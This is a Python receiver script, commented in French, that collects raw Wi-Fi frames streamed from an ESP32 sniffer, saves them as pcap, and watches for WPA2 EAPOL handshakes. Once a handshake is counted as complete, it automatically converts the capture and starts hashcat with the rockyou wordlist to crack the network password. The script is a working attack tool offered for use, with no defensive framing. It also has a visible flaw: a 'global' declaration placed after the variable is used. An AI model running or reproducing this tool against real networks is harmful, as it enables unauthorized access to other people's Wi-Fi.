#!/usr/bin/env python3
"""
Receiver Kali — reçoit les trames brutes de l'ESP32 via TCP,
écrit un .pcap standard et détecte les handshakes WPA2 (EAPOL).
Lance hashcat automatiquement si un handshake complet est capturé.

Usage :
    python3 tools/receiver.py
    python3 tools/receiver.py --port 9999 --out captures/
"""

import socket
import struct
import time
import subprocess
import argparse
from pathlib import Path

# ── Config ─────────────────────────────────────────────────────────────────────
HOST      = "0.0.0.0"
PORT      = 9999
OUT_DIR   = Path(__file__).parent.parent / "captures"
WORDLIST  = Path("/usr/share/wordlists/rockyou.txt")

# ── Couleurs ANSI ──────────────────────────────────────────────────────────────
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; X = "\033[0m"

def log(msg):  print(f"{C}[*]{X} {msg}")
def ok(msg):   print(f"{G}[+]{X} {msg}")
def warn(msg): print(f"{Y}[!]{X} {msg}")
def err(msg):  print(f"{R}[x]{X} {msg}")

# ── Format de trame ESP32 ──────────────────────────────────────────────────────
# En-tête 8 bytes : [timestamp 4B LE][length 2B LE][rssi 1B signé][canal 1B]
HDR = struct.Struct('<IHbB')   # timestamp, length, rssi, channel
HDR_SIZE = HDR.size            # = 8

# ── Écriture PCAP ─────────────────────────────────────────────────────────────
# DLT_IEEE802_11 = 105  (trames 802.11 brutes, sans radiotap)
_PCAP_GLOBAL = struct.pack('<IHHiIII',
    0xa1b2c3d4,   # magic
    2, 4,         # version
    0, 0,         # timezone, sigfigs
    65535,        # snaplen
    105,          # linktype = DLT_IEEE802_11
)

def _pcap_pkt_hdr(data_len):
    ts = time.time()
    return struct.pack('<IIII',
        int(ts),
        int((ts % 1) * 1_000_000),
        data_len, data_len,
    )

# ── Détection EAPOL / Handshake WPA2 ─────────────────────────────────────────
_EAPOL_LLC = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E])

def _mac(frame, off):
    return ':'.join(f'{frame[off+i]:02x}' for i in range(6))

def _is_eapol(frame):
    return len(frame) >= 34 and _EAPOL_LLC in frame[24:]

# ── Receiver ──────────────────────────────────────────────────────────────────

class Receiver:
    def __init__(self, host, port, out_dir):
        self.host    = host
        self.port    = port
        out_dir      = Path(out_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        ts           = time.strftime("%Y%m%d_%H%M%S")
        self.pcap    = out_dir / f"capture_{ts}.pcap"
        self._f      = None
        self._hands  = {}   # (bssid, client) → count EAPOL
        self._stats  = dict(total=0, mgmt=0, data=0, eapol=0)

    # ── PCAP ──────────────────────────────────────────────────────────────────

    def _open(self):
        self._f = open(self.pcap, 'wb')
        self._f.write(_PCAP_GLOBAL)
        ok(f"Capture → {self.pcap}")

    def _write(self, data):
        self._f.write(_pcap_pkt_hdr(len(data)))
        self._f.write(data)
        self._f.flush()

    # ── Traitement de chaque trame ─────────────────────────────────────────────

    def _process(self, data):
        s = self._stats
        s['total'] += 1
        if len(data) < 2:
            return
        ftype = (data[0] >> 2) & 0x03
        if ftype == 0:
            s['mgmt'] += 1
        elif ftype == 2:
            s['data'] += 1
            if _is_eapol(data):
                s['eapol'] += 1
                self._on_eapol(data)

    def _on_eapol(self, frame):
        bssid  = _mac(frame, 16)
        client = _mac(frame, 10)
        key    = (bssid, client)
        n      = self._hands.get(key, 0) + 1
        self._hands[key] = n
        label  = "COMPLET" if n >= 4 else f"msg {n}/4"
        warn(f"EAPOL [{label}] BSSID:{bssid}  CLIENT:{client}")
        if n >= 4:
            ok(f"Handshake WPA2 complet ! — {self.pcap.name}")
            self._crack(bssid)

    # ── Crack automatique ─────────────────────────────────────────────────────

    def _crack(self, bssid):
        if subprocess.run(['which', 'hcxpcapngtool'],
                          capture_output=True).returncode != 0:
            warn("hcxpcapngtool absent — sudo apt install hcxtools")
            return

        hf = self.pcap.with_suffix('.hc22000')
        r  = subprocess.run(
            ['hcxpcapngtool', '-o', str(hf), str(self.pcap)],
            capture_output=True
        )
        if not hf.exists():
            err(f"Conversion hc22000 échouée : {r.stderr.decode()[:100]}")
            return

        wl = WORDLIST if WORDLIST.exists() else WORDLIST.with_suffix('.txt.gz')
        if not wl.exists():
            warn(f"Wordlist introuvable : {wl}")
            warn(f"Lancer manuellement : hashcat -m 22000 {hf} <wordlist>")
            return

        ok(f"hashcat lancé — hash:{hf.name}  wordlist:{wl.name}")
        subprocess.Popen([
            'hashcat', '-m', '22000', str(hf), str(wl),
            '--quiet', '--status', '--status-timer=15',
        ])

    # ── Réception TCP ─────────────────────────────────────────────────────────

    @staticmethod
    def _recv_exact(conn, n):
        buf = b''
        while len(buf) < n:
            chunk = conn.recv(n - len(buf))
            if not chunk:
                return None
            buf += chunk
        return buf

    def _handle(self, conn, addr):
        ok(f"ESP32 connecté : {addr[0]}:{addr[1]}")
        self._open()
        t_log = time.time()

        try:
            while True:
                hdr = self._recv_exact(conn, HDR_SIZE)
                if hdr is None:
                    break

                ts, length, rssi, channel = HDR.unpack(hdr)
                if length == 0 or length > 2048:
                    continue

                data = self._recv_exact(conn, length)
                if data is None:
                    break

                self._write(data)
                self._process(data)

                if time.time() - t_log >= 5:
                    t_log = time.time()
                    s = self._stats
                    log(f"total={s['total']}  mgmt={s['mgmt']}  "
                        f"data={s['data']}  eapol={s['eapol']}"
                        f"  rssi={rssi}dBm  ch={channel}")

        except (ConnectionResetError, BrokenPipeError, OSError):
            pass
        finally:
            if self._f:
                self._f.close()
            conn.close()
            s = self._stats
            ok(f"Session terminée — {s['total']} trames — {self.pcap.name}")
            if s['eapol']:
                ok(f"{s['eapol']} trame(s) EAPOL capturée(s)")

    # ── Boucle serveur ─────────────────────────────────────────────────────────

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.host, self.port))
        srv.listen(1)
        log(f"Receiver en écoute sur {self.host}:{self.port}")
        log("Sur l'ESP32 : from lib.streaming import start; start()")
        print("─" * 48)

        try:
            while True:
                conn, addr = srv.accept()
                self._handle(conn, addr)
        except KeyboardInterrupt:
            warn("Receiver arrêté")
        finally:
            srv.close()


# ── Entrée ────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="ESP32 WiFi frame receiver")
    p.add_argument('--host',    default=HOST,        help="Interface d'écoute")
    p.add_argument('--port',    default=PORT,         type=int)
    p.add_argument('--out',     default=str(OUT_DIR), help="Dossier de sortie .pcap")
    p.add_argument('--wordlist',default=str(WORDLIST),help="Wordlist hashcat")
    args = p.parse_args()

    global WORDLIST
    WORDLIST = Path(args.wordlist)

    Receiver(args.host, args.port, args.out).run()


if __name__ == '__main__':
    main()
